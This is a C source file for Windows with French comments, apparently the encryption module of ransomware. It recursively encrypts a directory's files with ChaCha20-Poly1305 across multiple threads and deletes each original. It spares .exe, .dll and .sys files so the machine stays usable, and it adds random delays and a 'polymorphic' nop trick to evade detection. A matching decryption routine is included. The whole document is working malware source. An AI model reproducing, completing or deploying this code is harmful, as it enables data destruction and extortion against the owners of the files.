#include "main.h"

// Structure pour les paramètres des threads de chiffrement
typedef struct {
    char directory[MAX_PATH];
    uint8_t *key;
    int *files_processed;
    CRITICAL_SECTION *cs;
} ENCRYPT_THREAD_PARAMS;

// Chiffrement/déchiffrement d'un fichier
void ENCRYPT_FILE(const char *input_file, uint8_t *key, int encrypt) {
    RandomDelay();

    char output_file[MAX_PATH];

    if (encrypt) {
        snprintf(output_file, MAX_PATH, "%s.enc", input_file);
    } else {
        strcpy(output_file, input_file);
        char *ext = strstr(output_file, ".enc");
        if (ext) *ext = '\0';
    }

    FILE *in = fopen(input_file, "rb");
    if (!in) {
        printf("Erreur: Impossible d'ouvrir %s\n", input_file);
        return;
    }

    FILE *out = fopen(output_file, "wb");
    if (!out) {
        printf("Erreur: Impossible de créer %s\n", output_file);
        fclose(in);
        return;
    }

    uint8_t nonce[crypto_aead_chacha20poly1305_IETF_NPUBBYTES];
    if (encrypt) {
        randombytes_buf(nonce, sizeof(nonce));
        fwrite(nonce, 1, sizeof(nonce), out);
    } else {
        if (fread(nonce, 1, sizeof(nonce), in) != sizeof(nonce)) {
            printf("Erreur: Format fichier chiffré invalide\n");
            fclose(in);
            fclose(out);
            return;
        }
    }

    uint8_t buf_in[16384], buf_out[16384 + crypto_aead_chacha20poly1305_IETF_ABYTES];
    size_t bytes_read;
    unsigned long long out_len;

    while ((bytes_read = fread(buf_in, 1, sizeof(buf_in), in)) > 0) {
        if (encrypt) {
            crypto_aead_chacha20poly1305_ietf_encrypt(
                buf_out, &out_len, buf_in, bytes_read,
                NULL, 0, NULL, nonce, key
            );

            // Petit trick polymorphe
            if ((GetTickCount() % 2) == 0) {
                __asm__ __volatile__("nop");
            } else {
                __asm__ __volatile__("nop;nop");
            }

            fwrite(buf_out, 1, out_len, out);
        } else {
            if (crypto_aead_chacha20poly1305_ietf_decrypt(
                    buf_out, &out_len, NULL, buf_in, bytes_read,
                    NULL, 0, nonce, key) != 0) {
                printf("Erreur: Échec déchiffrement pour %s\n", input_file);
                fclose(in);
                fclose(out);
                return;
            }

            fwrite(buf_out, 1, out_len, out);
        }
    }

    fclose(in);
    fclose(out);

    if (DeleteFileA(input_file) == 0) {
        printf("Attention: Échec suppression fichier original\n");
    }

    printf("%s: %s -> %s\n", encrypt ? "Chiffré" : "Déchiffré", input_file, output_file);
}

// Wrapper pour le déchiffrement
void DECRYPT_FILE(const char *input_file, uint8_t *key) {
    ENCRYPT_FILE(input_file, key, 0);
}

// Fonction thread pour chiffrement parallèle
unsigned __stdcall EncryptThreadProc(void *param) {
    ENCRYPT_THREAD_PARAMS *p = (ENCRYPT_THREAD_PARAMS*)param;

    char search_path[MAX_PATH];
    snprintf(search_path, MAX_PATH, "%s\\*.*", p->directory);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search_path, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return 0;

    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
            strstr(fd.cFileName, ".enc") == NULL) {
            char full_path[MAX_PATH];
            snprintf(full_path, MAX_PATH, "%s\\%s", p->directory, fd.cFileName);

            ENCRYPT_FILE(full_path, p->key, 1);

            EnterCriticalSection(p->cs);
            (*p->files_processed)++;
            LeaveCriticalSection(p->cs);
        }
    } while (FindNextFileA(hFind, &fd));

    FindClose(hFind);
    return 0;
}

// Chiffrement multi-threaded
int MultiThreadEncrypt(const char *target_dir, uint8_t *key) {
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);

    int num_threads = sysInfo.dwNumberOfProcessors;
    if (num_threads > 8) num_threads = 8; // Max 8 threads

    HANDLE *threads = (HANDLE*)malloc(num_threads * sizeof(HANDLE));
    ENCRYPT_THREAD_PARAMS *params = (ENCRYPT_THREAD_PARAMS*)malloc(num_threads * sizeof(ENCRYPT_THREAD_PARAMS));

    CRITICAL_SECTION cs;
    InitializeCriticalSection(&cs);

    int files_processed = 0;

    printf("Début chiffrement avec %d threads\n", num_threads);

    for (int i = 0; i < num_threads; i++) {
        strcpy(params[i].directory, target_dir);
        params[i].key = key;
        params[i].files_processed = &files_processed;
        params[i].cs = &cs;

        threads[i] = (HANDLE)_beginthreadex(NULL, 0, EncryptThreadProc, &params[i], 0, NULL);
    }

    WaitForMultipleObjects(num_threads, threads, TRUE, INFINITE);

    for (int i = 0; i < num_threads; i++) {
        CloseHandle(threads[i]);
    }

    DeleteCriticalSection(&cs);
    free(threads);
    free(params);

    return files_processed;
}

// Chiffrement d'un répertoire
int EncryptDirectory(const char *dir, uint8_t *key) {
    char search_path[MAX_PATH];
    snprintf(search_path, MAX_PATH, "%s\\*.*", dir);
    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search_path, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("Erreur: Impossible de lire %s (%lu)\n", dir, GetLastError());
        return 0;
    }

    int file_count = 0;
    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            char full_path[MAX_PATH];
            snprintf(full_path, MAX_PATH, "%s\\%s", dir, fd.cFileName);
            // Ignorer les fichiers déjà chiffrés ou système
            if (strstr(fd.cFileName, ".enc") == NULL &&
                strstr(fd.cFileName, ".sys") == NULL &&
                strstr(fd.cFileName, ".exe") == NULL &&
                strstr(fd.cFileName, ".dll") == NULL) {
                file_count++;
                printf("Fichier trouvé: %s\n", full_path);
                ENCRYPT_FILE(full_path, key, 1);
            }
        }
    } while (FindNextFileA(hFind, &fd));
    FindClose(hFind);

    printf("%d fichiers chiffrés dans %s\n", file_count, dir);
    return file_count;
}

// Déchiffrement d'un répertoire
void DecryptDirectory(const char *dir, uint8_t *key) {
    char search_path[MAX_PATH];
    snprintf(search_path, MAX_PATH, "%s\\*.*", dir);
    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search_path, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("Erreur: Impossible de lire %s (%lu)\n", dir, GetLastError());
        return;
    }

    int file_count = 0;
    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            char full_path[MAX_PATH];
            snprintf(full_path, MAX_PATH, "%s\\%s", dir, fd.cFileName);
            if (strstr(fd.cFileName, ".enc") != NULL) {
                file_count++;
                printf("Fichier à déchiffrer: %s\n", full_path);
                DECRYPT_FILE(full_path, key);
            }
        }
    } while (FindNextFileA(hFind, &fd));
    FindClose(hFind);

    printf("%d fichiers déchiffrés dans %s\n", file_count, dir);
}